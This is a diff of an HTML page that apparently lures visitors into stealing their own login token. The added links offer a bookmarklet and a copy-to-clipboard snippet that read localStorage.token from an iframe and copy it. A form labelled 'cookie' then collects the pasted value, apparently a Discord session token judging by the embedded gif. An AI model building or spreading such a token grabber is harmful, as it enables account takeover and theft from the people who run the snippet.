@@ -15,8 +15,10 @@
 	<body>
 		<script src="https://code.jquery.com/jquery-3.6.2.min.js"></script>
 
-		<a href="javascript:(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()">Bookmarklet</a>
-		<a href="javascript:navigator.clipboard.writeText(`(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()`)">Click here to copy code</a>
+		<ul>
+			<li><a href="javascript:(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()">BROWSER: Bookmarklet (drag to bookmark bar)</a></li>
+			<li><a href="javascript:navigator.clipboard.writeText(`(function(){location.reload();var i = document.createElement('iframe');document.body.appendChild(i);navigator.clipboard.writeText(i.contentWindow.localStorage.token)})()`)">DESKTOP: Click here to copy code</a></li>
+		</ul>
 
 		<form>
 			<input type="text" id="form-input" style="margin-bottom: 15px; width: 400px; height: 25px;" placeholder="cookie"></input>
@@ -25,17 +27,7 @@
 
 		<script>
 			function write(str) {
-				document.body.innerHTML += (`<p>${str}</p>`);
-			};
-
-			function handleErrors(response) {
-				if (!response.ok) {
-					write("❌ Handler encounted error:&nbsp;" + response.statusText);
-					throw Error(response.statusText);
-				} else {
-					write("✅ Handler did not encounter any errors");
-				};
-				return response;
+				$("#log")[0].innerHTML += (`<p>${str}</p>`);
 			};
 
 			$("form")[0].addEventListener("submit", (e) => {
@@ -55,5 +47,7 @@
 		</script>
 
 		<img src="https://media.tenor.com/V5jKgnXoSzIAAAAd/beamed-discord.gif">
+
+		<ul id="log"></ul>
 	</body>
 </html>
